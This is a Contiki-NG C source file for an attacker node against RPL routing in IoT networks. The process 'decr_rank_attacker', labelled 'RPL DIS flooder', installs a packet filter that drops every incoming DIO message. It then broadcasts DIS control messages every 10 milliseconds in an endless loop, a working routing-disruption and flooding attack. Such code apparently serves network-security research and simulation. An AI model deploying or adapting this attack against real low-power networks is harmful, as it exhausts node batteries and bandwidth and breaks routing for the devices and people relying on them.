#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include <stdint.h>
#include <inttypes.h>
#include "rpl.h"
#include "net/packetbuf.h"
#include "net/ipv6/uipbuf.h"
#include "net/ipv6/uip-icmp6.h"

#include "sys/log.h"
#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO

#define WITH_SERVER_REPLY  1

/*---------------------------------------------------------------------------*/
PROCESS(decr_rank_attacker, "RPL DIS flooder");
AUTOSTART_PROCESSES(&decr_rank_attacker);

/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
ip_input(void)
{
  uint8_t proto = 0;
  uipbuf_get_last_header(uip_buf, uip_len, &proto);
  if (proto != UIP_PROTO_ICMP6) {
    LOG_INFO_("Packet accepted !\n");
    return NETSTACK_IP_PROCESS;
  }

  uint8_t icmp6_type = uip_buf[UIP_IPH_LEN];
  uint8_t icmp6_code = uip_buf[UIP_IPH_LEN + 1];
  LOG_INFO("Incoming packet proto: %d - icmp6 type: %d - icmp6 rpl code: %d from ", 
      proto, icmp6_type, icmp6_code);
  LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  LOG_INFO_("\n");
  
  if (icmp6_type == ICMP6_RPL && icmp6_code == RPL_CODE_DIO) {
    LOG_INFO("Dropped DIO packet !\n");
    return NETSTACK_IP_DROP;
  }
  LOG_INFO_("Packet accepted !\n");
  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
ip_output(const linkaddr_t *localdest)
{
  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
struct netstack_ip_packet_processor packet_processor = {
  .process_input = ip_input,
  .process_output = ip_output
};
/*---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(decr_rank_attacker, ev, data)
{
  static struct etimer periodic_timer;

  PROCESS_BEGIN();

  netstack_ip_packet_processor_add(&packet_processor);

  while (1) {
    etimer_set(&periodic_timer, 0.01 * CLOCK_SECOND);
    rpl_icmp6_dis_output(NULL);
    // LOG_INFO("Sent DIS\n");
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
    etimer_reset(&periodic_timer);
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
